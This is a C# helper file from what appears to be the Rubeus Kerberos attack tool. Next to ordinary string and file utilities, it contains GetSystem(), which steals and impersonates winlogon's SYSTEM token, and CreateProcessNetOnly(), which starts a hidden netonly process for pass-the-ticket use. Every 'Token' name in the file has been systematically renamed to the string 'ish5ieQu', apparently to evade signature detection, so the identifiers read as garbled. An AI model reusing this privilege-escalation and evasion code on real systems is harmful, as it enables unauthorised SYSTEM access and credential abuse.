using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using Rubeus.lib.Interop;

namespace Rubeus
{
    public class Helpers
    {
        #region String Helpers

        public static IEnumerable<string> Split(string text, int partLength)
        {
            // splits a string into partLength parts
            if (text == null) { Console.WriteLine("[ERROR] Split() - singleLineString"); }
            if (partLength < 1) { Console.WriteLine("[ERROR] Split() - 'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static bool IsBase64String(string s)
        {
            s = s.Trim();
            return (s.Length % 4 == 0) && Regex.IsMatch(s, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        public static byte[] StringToByteArray(string hex)
        {
            // converts a rc4/AES/etc. string into a byte array representation

            if ((hex.Length % 16) != 0)
            {
                Console.WriteLine("\r\n[X] Hash must be 16, 32 or 64 characters in length\r\n");
                System.Environment.Exit(1);
            }

            // yes I know this inefficient
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        #endregion


        #region ish5ieQu Helpers

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool GetSystem()
        {
            // helper to elevate to SYSTEM for Kerberos ticket enumeration via token impersonation
            if (IsHighIntegrity())
            {
                IntPtr hish5ieQu = IntPtr.Zero;

                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with Duplicateish5ieQu
                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                // TOKEN_DUPLICATE = 0x0002
                bool success = Interop.OpenProcessish5ieQu(handle, 0x0002, out hish5ieQu);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - OpenProcessish5ieQu failed!");
                    return false;
                }

                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                // 2 == SecurityImpersonation
                IntPtr hDupish5ieQu = IntPtr.Zero;
                success = Interop.Duplicateish5ieQu(hish5ieQu, 2, ref hDupish5ieQu);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - Duplicateish5ieQu failed!");
                    return false;
                }

                success = Interop.ImpersonateLoggedOnUser(hDupish5ieQu);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - ImpersonateLoggedOnUser failed!");
                    return false;
                }

                // clean up the handles we created
                Interop.CloseHandle(hish5ieQu);
                Interop.CloseHandle(hDupish5ieQu);

                if (!IsSystem())
                {
                    return false;
                }

                return true;
            }
            else
            {
                return false;
            }
        }

        public static bool IsSystem()
        {
            // returns true if the current user is "NT AUTHORITY\SYSTEM"
            var currentSid = WindowsIdentity.GetCurrent().User;
            return currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid);
        }

        public static LUID GetCurrentLUID()
        {
            // helper that returns the current logon session ID by using Getish5ieQuInformation w/ TOKEN_INFORMATION_CLASS

            var ish5ieQuInfLength = 0;
            var luid = new LUID();

            // first call gets lenght of ish5ieQuInformation to get proper struct size
            var Result = Interop.Getish5ieQuInformation(WindowsIdentity.GetCurrent().ish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, IntPtr.Zero, ish5ieQuInfLength, out ish5ieQuInfLength);

            var ish5ieQuInformation = Marshal.AllocHGlobal(ish5ieQuInfLength);

            // second call actually gets the information
            Result = Interop.Getish5ieQuInformation(WindowsIdentity.GetCurrent().ish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, ish5ieQuInformation, ish5ieQuInfLength, out ish5ieQuInfLength);

            if (Result)
            {
                var ish5ieQuStatistics = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(ish5ieQuInformation, typeof(Interop.TOKEN_STATISTICS));
                luid = new LUID(ish5ieQuStatistics.AuthenticationId);
            }
            else
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] Getish5ieQuInformation error: {0}", lastError);
                Marshal.FreeHGlobal(ish5ieQuInformation);
            }

            return luid;
        }

        public static LUID CreateProcessNetOnly(string commandLine, bool show = false)
        {
            // creates a hidden process with random /netonly credentials,
            //  displayng the process ID and LUID, and returning the LUID

            // Note: the LUID can be used with the "ptt" action

            Interop.PROCESS_INFORMATION pi;
            var si = new Interop.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            if (!show)
            {
                // hide the window
                si.wShowWindow = 0;
                si.dwFlags = 0x00000001;
            }
            Console.WriteLine("[*] Showing process : {0}", show);
            var luid = new LUID();

            // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
            if (!Interop.CreateProcessWithLogonW(Helpers.RandomString(8), Helpers.RandomString(8), Helpers.RandomString(8), 0x00000002, commandLine, String.Empty, 0, 0, null, ref si, out pi))
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
                return new LUID();
            }

            Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
            Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);

            var hish5ieQu = IntPtr.Zero;
            // TOKEN_QUERY == 0x0008
            var success = Interop.OpenProcessish5ieQu(pi.hProcess, 0x0008, out hish5ieQu);
            if (!success)
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] OpenProcessish5ieQu error: {0}", lastError);
                return new LUID();
            }

            var ish5ieQuInfLength = 0;
            bool Result;

            // first call gets lenght of ish5ieQuInformation to get proper struct size
            Result = Interop.Getish5ieQuInformation(hish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, IntPtr.Zero, ish5ieQuInfLength, out ish5ieQuInfLength);

            var ish5ieQuInformation = Marshal.AllocHGlobal(ish5ieQuInfLength);

            // second call actually gets the information
            Result = Interop.Getish5ieQuInformation(hish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, ish5ieQuInformation, ish5ieQuInfLength, out ish5ieQuInfLength);

            if (Result)
            {
                var ish5ieQuStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(ish5ieQuInformation, typeof(Interop.TOKEN_STATISTICS));
                luid = new LUID(ish5ieQuStats.AuthenticationId);
                Console.WriteLine("[+] LUID            : {0}", luid);
            }
            else
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] Getish5ieQuInformation error: {0}", lastError);
                Marshal.FreeHGlobal(ish5ieQuInformation);
                Interop.CloseHandle(hish5ieQu);
                return new LUID();
            }

            Marshal.FreeHGlobal(ish5ieQuInformation);
            Interop.CloseHandle(hish5ieQu);

            return luid;
        }

        #endregion


        #region File Helpers

        static public string GetBaseFromFilename(string filename)
        {
            return SplitBaseAndExtension(filename)[0];
        }

        static public string GetExtensionFromFilename(string filename)
        {
            return SplitBaseAndExtension(filename)[1];
        }

        // Splits filename by into a basename and extension 
        // Returns an array representing [basename, extension]
        static public string[] SplitBaseAndExtension(string filename)
        {
            string[] result = { filename, "" };
            string[] splitName = filename.Split('.');

            if (splitName.Length > 1)
            {
                result[1] = $".{splitName.Last()}";
                result[0] = filename.Substring(0, filename.Length - result[1].Length);
            }

            return result;
        }

        // Great method from http://forcewake.me/today-i-learned-sanitize-file-name-in-csharp/
        static public string MakeValidFileName(string name)
        {
            string invalidChars = new string(Path.GetInvalidFileNameChars());
            string escapedInvalidChars = Regex.Escape(invalidChars);
            string invalidRegex = string.Format(@"([{0}]*\.+$)|([{0}]+)", escapedInvalidChars);

            return Regex.Replace(name, invalidRegex, "_");
        }

        #endregion


        #region Misc Helpers

        static public int SearchBytePattern(byte[] pattern, byte[] bytes)
        {
            List<int> positions = new List<int>();
            int patternLength = pattern.Length;
            int totalLength = bytes.Length;
            byte firstMatchByte = pattern[0];
            for (int i = 0; i < totalLength; i++)
            {
                if (firstMatchByte == bytes[i] && totalLength - i >= patternLength)
                {
                    byte[] match = new byte[patternLength];
                    Array.Copy(bytes, i, match, 0, patternLength);
                    if (match.SequenceEqual<byte>(pattern))
                    {
                        return i;
                    }
                }
            }
            return 0;
        }

        static public bool WriteBytesToFile(string filename, byte[] data, bool overwrite = false)
        {
            bool result = true;
            string filePath = Path.GetFullPath(filename);

            try
            {
                if (!overwrite)
                {
                    if (File.Exists(filePath))
                    {
                        throw new Exception(String.Format("{0} already exists! Data not written to file.\r\n", filePath));
                    }
                }
                File.WriteAllBytes(filePath, data);
            }
            catch (Exception e)
            {
                Console.WriteLine("\r\nException: {0}", e.Message);
                result = false;
            }

            return result;
        }

        #endregion
    }
}